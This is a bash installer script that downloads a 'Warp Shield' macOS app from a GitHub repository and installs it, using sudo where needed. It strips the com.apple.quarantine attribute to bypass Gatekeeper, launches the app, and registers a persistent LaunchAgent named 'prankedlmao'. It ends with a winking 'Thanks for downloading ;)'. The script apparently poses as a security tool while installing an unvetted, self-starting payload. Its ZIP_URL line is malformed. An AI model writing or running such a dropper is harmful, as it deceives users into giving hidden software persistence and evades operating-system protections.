#!/usr/bin/env bash
set -euo pipefail

# --- Config ---
ZIP_URL="ZIP_URL="https://raw.githubusercontent.com/44sk/expert-disco/refs/heads/main/Warp%20Shield.zip"

"
TMPDIR="$(mktemp -d)"
APP_NAME="Warp Shield.app"

cleanup() {
  rm -rf "$TMPDIR"
}
trap cleanup EXIT

cd "$TMPDIR"

# --- Download and unzip the app ---
echo "Downloading Warp Shield..."
curl -L --fail --retry 3 "$ZIP_URL" -o warp-shield.zip
unzip -q warp-shield.zip
rm warp-shield.zip

# --- Locate the .app ---
APP_PATH="$(find . -type d -name "$APP_NAME" -print -quit)"
if [ -z "$APP_PATH" ]; then
  echo "Error: $APP_NAME not found in archive."
  exit 1
fi

# --- Move to /Applications ---
DEST="/Applications/$(basename "$APP_PATH")"
if [ -d "$DEST" ]; then
  echo "Removing existing version..."
  if [ -w "$DEST" ]; then
    rm -rf "$DEST"
  else
    sudo rm -rf "$DEST"
  fi
fi

echo "Installing to /Applications..."
if [ -w "/Applications" ]; then
  mv "$APP_PATH" /Applications/
else
  sudo mv "$APP_PATH" /Applications/
fi

# --- Fix permissions and remove quarantine ---
xattr -d -r com.apple.quarantine "$DEST" 2>/dev/null || true
chmod +x "$DEST/Contents/MacOS/"* 2>/dev/null || true

# --- Open the app ---
open "$DEST"

# --- LaunchAgent setup ---
PLIST_SRC="$DEST/Contents/Resources/com.Warpshield.prankedlmao.plist"
PLIST_DST="$HOME/Library/LaunchAgents/com.Warpshield.prankedlmao.plist"

mkdir -p "$HOME/Library/LaunchAgents"

# --- Copy plist ---
cp "$PLIST_SRC" "$PLIST_DST"

# --- Set permissions ---
chmod 644 "$PLIST_DST"
chown "$USER":staff "$PLIST_DST"

# --- Validate plist ---
plutil -lint "$PLIST_DST"

# --- Unload old agent if any, then load ---
launchctl bootout gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
launchctl bootstrap gui/$(id -u) "$PLIST_DST"

# --- Check if running ---
if launchctl list | grep -q prankedlmao; then
    echo "LaunchAgent loaded successfully!"
else
    echo "LaunchAgent did not load."
fi

# --- Final message ---
echo
echo "Thanks for downloading ;)"
